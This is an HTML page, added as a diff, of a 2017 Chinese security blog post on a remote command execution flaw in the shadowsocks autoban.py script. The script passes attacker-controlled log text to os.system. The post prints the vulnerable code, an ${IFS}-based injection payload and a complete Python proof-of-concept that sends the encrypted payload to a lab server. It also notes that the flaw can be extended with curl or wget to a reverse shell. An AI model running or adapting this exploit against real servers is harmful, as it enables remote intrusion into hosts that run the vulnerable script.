@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      shadowsocks远程命令执行 | Unothing 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+      <meta name="author" content="Unothing">
+    
+    
+
+    <meta name="description" content="利用条件：  靶机上的shadowsocks是从github上clone的 靶机开启了autoban.py脚本   问题出在shadowsocks-master/utils/autoban.py中1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/us">
+<meta name="keywords" content="shadowsocks">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shadowsocks远程命令执行 | Unothing">
+<meta property="og:url" content="https://unothing.github.io/posts/ss-rat/index.html">
+<meta property="og:site_name" content="Unothing">
+<meta property="og:description" content="利用条件：  靶机上的shadowsocks是从github上clone的 靶机开启了autoban.py脚本   问题出在shadowsocks-master/utils/autoban.py中1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/us">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-05-10T03:35:06.468Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="shadowsocks远程命令执行 | Unothing">
+<meta name="twitter:description" content="利用条件：  靶机上的shadowsocks是从github上clone的 靶机开启了autoban.py脚本   问题出在shadowsocks-master/utils/autoban.py中1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/us">
+    
+    
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Unothing</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">列表</a></li>
+              
+                
+                <li class="navigation__item"><a href="/categories" title="" class="">分类</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">shadowsocks远程命令执行</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2017-11-24" class="post-meta__date date">2017-11-24</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/shadowsocks/">shadowsocks</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <p>利用条件：</p>
+<ol>
+<li>靶机上的<code>shadowsocks</code>是从<code>github</code>上<code>clone</code>的</li>
+<li>靶机开启了<code>autoban.py</code>脚本</li>
+</ol>
+<hr>
+<p>问题出在<code>shadowsocks-master/utils/autoban.py</code>中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"></div><div class="line"># Copyright (c) 2015 clowwindy</div><div class="line">#</div><div class="line"># Permission is hereby granted, free of charge, to any person obtaining a copy</div><div class="line"># of this software and associated documentation files (the &quot;Software&quot;), to deal</div><div class="line"># in the Software without restriction, including without limitation the rights</div><div class="line"># to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</div><div class="line"># copies of the Software, and to permit persons to whom the Software is</div><div class="line"># furnished to do so, subject to the following conditions:</div><div class="line">#</div><div class="line"># The above copyright notice and this permission notice shall be included in</div><div class="line"># all copies or substantial portions of the Software.</div><div class="line">#</div><div class="line"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</div><div class="line"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</div><div class="line"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</div><div class="line"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</div><div class="line"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</div><div class="line"># OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</div><div class="line"># SOFTWARE.</div><div class="line"></div><div class="line">from __future__ import absolute_import, division, print_function, \</div><div class="line">    with_statement</div><div class="line"></div><div class="line">import os</div><div class="line">import sys</div><div class="line">import argparse</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    parser = argparse.ArgumentParser(description=&apos;See README&apos;)</div><div class="line">    parser.add_argument(&apos;-c&apos;, &apos;--count&apos;, default=3, type=int,</div><div class="line">                        help=&apos;with how many failure times it should be &apos;</div><div class="line">                             &apos;considered as an attack&apos;)</div><div class="line">    config = parser.parse_args()</div><div class="line">    ips = &#123;&#125;</div><div class="line">    banned = set()</div><div class="line">    for line in sys.stdin:</div><div class="line">        if &apos;can not parse header when&apos; in line:</div><div class="line">            ip = line.split()[-1].split(&apos;:&apos;)[-2]</div><div class="line">            if ip not in ips:</div><div class="line">                ips[ip] = 1</div><div class="line">                print(ip)</div><div class="line">                sys.stdout.flush()</div><div class="line">            else:</div><div class="line">                ips[ip] += 1</div><div class="line">            if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p>
+<p>从sys.stdin读取输入，然后判断是否包含<code>can not parse header when</code>字样，如果有就进行截断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip = line.split()[-1].split(&apos;:&apos;)[-2]</div></pre></td></tr></table></figure></p>
+<p><code>split()</code>是采用默认空格为分隔符<br>当同一个<code>ip</code>出现的次数超过了设定的值（默认为3）,就会直接把它代入执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if ip not in banned and ips[ip] &gt;= config.count:</div><div class="line">                banned.add(ip)</div><div class="line">                cmd = &apos;iptables -A INPUT -s %s -j DROP&apos; % ip</div><div class="line">                print(cmd, file=sys.stderr)</div><div class="line">                sys.stderr.flush()</div><div class="line">                os.system(cmd)</div></pre></td></tr></table></figure></p>
+<hr>
+<p>在靶机<code>192.168.32.51</code>上<br>下载<code>github</code>上的<code>shadowsocks</code>，使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/server.py -p 12345 -k 12345 --log-file /tmp/ss.log -d start</div></pre></td></tr></table></figure></p>
+<p>即可开启ss的服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-p	端口</div><div class="line">-k	口令</div><div class="line">--log-file	日志文件</div><div class="line">-d start	后台启动</div></pre></td></tr></table></figure></p>
+<p>客户端可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -s 192.168.32.51 -p 12345 -l 8090 -k 12345</div></pre></td></tr></table></figure></p>
+<p>登录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-s	服务器地址</div><div class="line">-p	服务器端口</div><div class="line">-l	本地端口</div><div class="line">-k	服务器登录口令</div></pre></td></tr></table></figure></p>
+<p>也可采用加载本地配置文件的方式启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/local.py -c /etc/shadowsocks.json</div></pre></td></tr></table></figure></p>
+<p>发现客户端对发送内容加密后才发送的。</p>
+<p>ss服务器在接收到客户端发送过来的请求后，会对请求进行解析。关键解析函数<code>shadowsocks/common.py</code>中<code>parse_header(data)</code>函数在判断请求目标地址类型为域名后，会将其写入日志文件。</p>
+<p>根据前面的分析，<code>payload</code>中是不能出现空格和<code>:</code>的，<code>:</code>可以避免，但是想执行命令，空格是必须的。<br>这里使用Linux中自带的IFS环境变量产生空格。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS(Internal Field Seprator)，即内部域分隔符，完整定义是“The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substituioin.”。</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IFS=$&apos; \t\n&apos;</div></pre></td></tr></table></figure>
+<p>使用<code>||</code>和<code>${}</code>，尝试写入一个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n</div></pre></td></tr></table></figure></p>
+<p>现在只需模拟客户端，把<code>payload</code>写到请求地址中就可以了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"># coding:utf-8</div><div class="line">import socket</div><div class="line">import sys,os</div><div class="line">sys.path.insert(0, os.path.join(os.path.dirname(__file__), &apos;../&apos;))</div><div class="line">import cryptor </div><div class="line"></div><div class="line">head = &quot;&quot;&quot;can not parse header when ||echo$&#123;IFS%??&#125;&apos;hacked！&apos;&gt;testhahaha.txt:\n&quot;&quot;&quot;</div><div class="line">target = (&quot;03%02x%s0050&quot; % (len(head), head.encode(&apos;hex&apos;))).decode(&apos;hex&apos;) # 参考socks5协议, 03表示target是域名，然后两字节域名长度，再是目的地址，最后两字节是port</div><div class="line"></div><div class="line">for i in range(3):</div><div class="line">    c = cryptor.Cryptor(&quot;12345&quot;, &quot;aes-256-cfb&quot;)</div><div class="line">    tosend = c.encrypt(target)</div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    s.connect((&apos;192.168.32.51&apos;, 12345))</div><div class="line">    s.send(tosend)</div><div class="line">    s.close()</div></pre></td></tr></table></figure></p>
+<p>把这个py文件放入shadowsocks文件夹中运行即可。、</p>
+<p>在服务器端执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ./shadowsocks/utils/autoban.py &lt; /tmp/ss.log</div></pre></td></tr></table></figure></p>
+<p>在当前文件夹下就会生成<code>testhahaha.txt</code>文档,证明命令执行成功</p>
+<p>实际使用时，可以结合<code>curl</code>、<code>wget</code>命令从服务器下载文件，然后反弹shell。</p>
+<hr>
+<p>参考：<br><a href="https://paper.tuisec.win/detail/63207b0184fe59e" target="_blank" rel="external">https://paper.tuisec.win/detail/63207b0184fe59e</a><br><a href="http://foreversong.cn/archives/730" target="_blank" rel="external">http://foreversong.cn/archives/730</a><br><a href="https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/" target="_blank" rel="external">https://x41-dsec.de/lab/advisories/x41-2017-008-shadowsocks/</a><br><a href="https://github.com/shadowsocks/shadowsocks/tree/master" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks/tree/master</a><br><a href="https://www.cnblogs.com/happyhotty/articles/2181522.html" target="_blank" rel="external">SOCKS5协议[rfc1928]</a><br><a href="http://unixboy.iteye.com/blog/499329" target="_blank" rel="external">bash ${ } 用法总结 </a></p>
+
+  </section>
+
+  <section class="post-comments">
+
+    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
+    
+</section>
+
+
+</article>
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
